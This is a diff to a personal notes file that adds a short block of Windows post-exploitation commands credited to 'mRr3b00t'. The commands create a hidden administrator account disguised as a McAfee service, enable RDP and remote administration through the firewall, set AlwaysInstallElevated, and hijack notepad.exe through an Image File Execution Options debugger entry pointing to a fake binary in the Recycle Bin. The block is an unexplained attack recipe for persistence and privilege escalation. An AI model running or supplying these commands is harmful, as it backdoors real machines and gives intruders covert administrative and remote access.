@@ -1,5 +1,18 @@
 # notes 
 
+### mRr3b00t does the basics and I add some
+
+````
+net user /add MfeEPSvc h4x0r0p53c!
+net localgroup administrators /add MfeEPSvc
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+netsh advfirewall firewall set rule group="remote administration" new enable=yes
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v "Debugger" /t REG_SZ /d "C:\$Recycle.Bin\notpad.exe"
+
+````
+
 ### matty graeber I think it was:
 
 ````
